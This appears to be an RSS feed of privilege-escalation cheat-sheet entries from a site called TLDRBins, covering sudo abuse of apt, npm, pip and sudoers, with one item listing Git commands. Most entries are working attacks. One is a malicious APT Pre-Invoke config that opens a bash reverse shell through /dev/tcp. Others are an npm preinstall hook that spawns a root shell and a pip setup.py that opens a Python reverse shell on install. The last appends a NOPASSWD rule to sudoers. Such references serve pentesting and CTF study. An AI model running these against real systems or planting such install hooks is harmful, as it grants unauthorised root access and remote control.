channel.title: Sudo on TLDRBins
channel.description: Recent content in Sudo on TLDRBins

item.title: Apt
item.description: MITM (Man-in-the-Middle) 1. Add Proxy Path in Target Machine export http_proxy=http://<LOCAL_IP>:<LOCAL_PROXY_PORT> 2. Start Proxy in Local Machine # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port <LOCAL_PROXY_PORT> 3. Redirect Traffic to Our Server # Edit /etc/hosts in target machine <LOCAL_IP> apt.update.example.com SUDO 1. Create a Malicious Config echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'\''"}' > /etc/apt/apt.conf.d/evil 2. Exploit sudo apt update -y

item.title: Git
item.description: General # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log <BRANCH_NAME> --oneline # Show diff, a and b are commit hash # a is the older commit git diff <A_COMMIT_HASH> <B_COMMIT_HASH> # Show commit git show <COMMIT_HASH> # Clone private repo git clone http://<USER>:<TOKEN>@<DOMAIN>/<OWNER>/<REPO>.

item.title: Npm
item.description: Privesc #1: Create a Malicious Package Create a 'package.json' { "name": "root", "version": "1.0.0", "scripts": { "preinstall": "/bin/bash" } } mkdir test mv package.json test/ sudo npm i test/ --unsafe

item.title: Pip
item.description: Privesc #1: Create a Malicious Package 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("<LOCAL_IP>",<LOCAL_PORT>)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call(["/bin/sh", "-i"]) setup( cmdclass={ "install": Exploit } ) 2. Exploit # Run sudo pip install .

item.title: Sudoers
item.description: Abuse #1: Writable /etc/sudoers chmod 600 /etc/sudoers echo '<USER> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers chmod 440 /etc/sudoers
